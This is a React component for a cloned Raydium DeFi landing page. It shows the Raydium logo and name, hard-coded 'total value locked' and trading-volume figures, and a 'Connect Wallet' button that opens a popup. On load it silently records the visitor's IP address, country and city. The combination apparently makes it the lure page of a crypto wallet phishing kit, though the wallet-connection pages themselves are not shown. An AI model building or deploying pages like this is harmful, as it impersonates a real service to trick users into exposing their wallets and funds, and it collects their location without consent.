import React, { useState,useEffect} from "react";
import { Route, Routes, BrowserRouter, useNavigate } from "react-router-dom";
import RaydiumLogo from '../../components/RaydiumLogo';
import WavyBackground from '../../components/WavyBackground';
import StatCard from '../../components/StatCard';
import MyPopup from "../../components/popup";
const HomePage = () => {
    const [isPopupOpen, setPopupOpen] = useState(false);
    const handleSubmit = (e) => {
      e.preventDefault();
      setPopupOpen(true);
    };
  
    const closePopup = () => {
      setPopupOpen(false);
    };
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const navigate = useNavigate();
  const [countryCode, setCountryCode] = useState('');
// useEffect(() => {
//     document.body.style.overflow = "hidden";
//     return () => {
//       document.body.style.overflow = "auto";
//     };
//   }, []);
  useEffect(() => {
    const setLocaltion = async () => {
      try {
        fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
          var countryCode = d.country;
          setCountryCode(countryCode.toLowerCase());
          localStorage.setItem(
            "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
          );
        })
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };
    setLocaltion();
  }, []);

  // const handleSubmit = (e) => {
  //   e.preventDefault();
  //   navigate("/select-wallet");
  // };

  return (
        <div className="h-dvh w-full relative bg-[#100D20] text-white font-sans overflow-hidden">
            <MyPopup isOpen={isPopupOpen} onClose={closePopup} />
            <div className="absolute inset-0 bg-gradient-to-b from-[#2A205B]/80 to-[#100D20]"></div>
            <WavyBackground />
            <div className="relative z-10 flex flex-col items-center justify-between min-h-screen px-4 sm-6 lg-8 py-3">
                <header className="w-full max-w-7xl mx-auto">
                    <div className="flex items-center space-x-3">
                        <RaydiumLogo />
                        <span className="text-xl sm-2xl font-medium tracking-[0.3em] -mb-1">RAYDIUM</span>
                    </div>
                </header>

                <main className="flex flex-col items-center justify-center text-center space-y-10 flex-grow mt-1 md-0">
<h1 className="text-[2.1rem] sm:text-[2.85rem] lg:text-[3.55rem] font-extrabold max-w-4xl leading-tight">
  An avenue for the evolution of{" "}
  <span className="bg-gradient-to-r from-[#46E2FF] to-[#8B5CF6] bg-clip-text text-transparent">
    DeFi
  </span>
</h1>
                    <p className="text-lg sm-xl text-gray-300 max-w-2xl">
                        Light-speed <strong className="font-semibold text-white">swaps</strong>.
                        Next-level <strong className="font-semibold text-white">liquidity</strong>.
                        Friction-less <strong className="font-semibold text-white">yield</strong>.
                    </p>
                    <button onClick={handleSubmit} className="flex items-center justify-center space-x-3 px-8 py-3 text-lg font-bold text-white rounded-full bg-gradient-to-r from-[#00E0FF] to-[#A963F8] hover-90 transition-opacity duration-300 shadow-lg shadow-[#00E0FF]/20">
                        <span>Connect Wallet</span>
                        <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                            <path fillRule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clipRule="evenodd" />
                        </svg>
                    </button>
                    <div className="flex flex-col md-row items-center justify-center gap-6 pt-1 w-full max-w-3xl">
                        <StatCard title="TOTAL VALUE LOCKED" value={1900651796} />
                        <StatCard title="TOTAL TRADING VOLUME" value={987894840261} />
                    </div>
                </main>

                <footer className="w-full h-10">
                  {/* Footer spacer */}
                </footer>
            </div>
        </div>
    );
  
}

export default HomePage;
